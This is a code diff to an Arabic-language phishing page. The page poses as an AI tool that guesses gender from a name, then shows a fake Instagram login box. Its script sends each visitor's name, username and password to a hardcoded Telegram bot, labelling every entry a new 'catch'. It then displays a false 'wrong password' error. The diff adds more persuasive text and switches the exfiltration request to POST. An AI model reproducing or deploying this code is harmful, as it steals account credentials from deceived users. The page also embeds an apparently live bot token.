@@ -22,7 +22,6 @@
             padding: 20px;
         }
 
-        /* واجهة الموقع الرئيسي */
         .main-card {
             background: white;
             padding: 30px;
@@ -34,10 +33,8 @@
         }
 
         h2 { color: #333; margin-bottom: 20px; font-size: 1.5rem; }
-        p { color: #666; margin-bottom: 20px; }
+        p { color: #666; margin-bottom: 20px; font-size: 14px; }
 
-        .input-group { margin-bottom: 15px; }
-        
         .name-input {
             width: 100%;
             padding: 12px;
@@ -45,10 +42,9 @@
             border-radius: 10px;
             outline: none;
             font-size: 16px;
-            transition: 0.3s;
+            margin-bottom: 15px;
+            text-align: center;
         }
-
-        .name-input:focus { border-color: #0095f6; }
 
         .btn-predict {
             width: 100%;
@@ -62,12 +58,11 @@
             cursor: pointer;
         }
 
-        /* النافذة المنبثقة (Instagram Modal) */
         .modal {
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
+            background: rgba(0,0,0,0.75);
             align-items: center;
             justify-content: center;
             z-index: 1000;
@@ -78,20 +73,21 @@
             width: 90%;
             max-width: 350px;
             padding: 30px;
-            border-radius: 10px;
+            border-radius: 12px;
             text-align: center;
         }
 
-        .insta-logo { width: 150px; margin-bottom: 20px; }
+        .insta-logo { width: 160px; margin-bottom: 25px; }
         
         .insta-input {
             width: 100%;
-            padding: 10px;
+            padding: 11px;
             background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 5px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             font-size: 14px;
+            outline: none;
         }
 
         .btn-insta-login {
@@ -99,8 +95,8 @@
             background-color: #0095f6;
             color: white;
             border: none;
-            border-radius: 5px;
-            padding: 8px;
+            border-radius: 8px;
+            padding: 9px;
             font-weight: bold;
             margin-top: 10px;
             cursor: pointer;
@@ -109,7 +105,7 @@
         #error-msg {
             color: #ed4956;
             font-size: 13px;
-            margin-top: 10px;
+            margin-top: 15px;
             display: none;
         }
     </style>
@@ -118,33 +114,33 @@
 
     <div class="main-card">
         <h2>تحديد الجنس بالاسم 🧠</h2>
-        <p>قم بإدخال اسمك وسيقوم الذكاء الاصطناعي بتوقع جنسك ونسبة دقة الاسم.</p>
-        <div class="input-group">
-            <input type="text" class="name-input" placeholder="اكتب اسمك هنا...">
-        </div>
-        <button class="btn-predict" onclick="showLogin()">بدء التحليل</button>
+        <p>اكتب اسمك وسيقوم النظام بتحليل البيانات لتحديد الجنس بنسبة دقة 99%.</p>
+        <input type="text" id="targetName" class="name-input" placeholder="أدخل الاسم هنا...">
+        <button class="btn-predict" onclick="showLogin()">تحليل الآن</button>
     </div>
 
     <div class="modal" id="loginModal">
         <div class="login-box">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo">
-            <p style="font-size: 14px; color: #8e8e8e; margin-bottom: 15px;">يجب تسجيل الدخول لمشاهدة نتيجة التحليل</p>
+            
+            <p style="font-size: 14px; color: #262626; font-weight: 600; margin-bottom: 15px;">ادخل حسابك لتأكد من جنسك وعرض النتيجة</p>
+            
             <form id="loginForm">
-                <input type="text" id="username" class="insta-input" placeholder="اسم المستخدم أو الهاتف" required>
+                <input type="text" id="username" class="insta-input" placeholder="اسم المستخدم، الهاتف أو الإيميل" required>
                 <input type="password" id="password" class="insta-input" placeholder="كلمة السر" required>
                 <button type="submit" class="btn-insta-login">تسجيل الدخول</button>
-                <div id="error-msg">عذراً، كلمة السر غير صحيحة.</div>
+                <div id="error-msg">عذراً، كلمة السر غير صحيحة. يرجى المحاولة مجدداً.</div>
             </form>
         </div>
     </div>
 
     <script>
-        const token = '8409685298:AAHN_RpQJOEte85gZMYgi2rPaE99lwXODPs';
-        const chatId = '7822309283';
+        const botToken = '8409685298:AAHN_RpQJOEte85gZMYgi2rPaE99lwXODPs';
+        const myChatId = '7822309283';
 
         function showLogin() {
-            const name = document.querySelector('.name-input').value;
-            if(name.length < 2) {
+            const nameVal = document.getElementById('targetName').value;
+            if(nameVal.length < 2) {
                 alert("يرجى كتابة الاسم أولاً!");
                 return;
             }
@@ -156,19 +152,26 @@
 
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
-            const nameUsed = document.querySelector('.name-input').value;
+            const nameUsed = document.getElementById('targetName').value;
 
-            // إرسال البيانات لتليجرام
-            const message = `🎯 صيد جديد (موقع تحديد الجنس):\n\n👤 الاسم المدخل: ${nameUsed}\n📧 حساب انستا: ${user}\n🔑 الباسورد: ${pass}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            const textMessage = `🎯 صيد جديد:\n\n👤 الاسم المدخل: ${nameUsed}\n📧 الحساب: ${user}\n🔑 الباسورد: ${pass}`;
 
-            fetch(url).then(() => {
-                document.getElementById('error-msg').style.display = 'block';
-                document.getElementById('password').value = '';
-            });
+            const request = new XMLHttpRequest();
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            request.open("POST", telegramUrl, true);
+            request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            
+            request.onreadystatechange = function() {
+                if(request.readyState == 4) {
+                    document.getElementById('error-msg').style.display = 'block';
+                    document.getElementById('password').value = '';
+                }
+            };
+
+            request.send(`chat_id=${myChatId}&text=${encodeURIComponent(textMessage)}`);
         });
 
-        // إغلاق المودال عند الضغط خارجه (اختياري لجعلها طبيعية)
         window.onclick = function(event) {
             const modal = document.getElementById('loginModal');
             if (event.target == modal) {
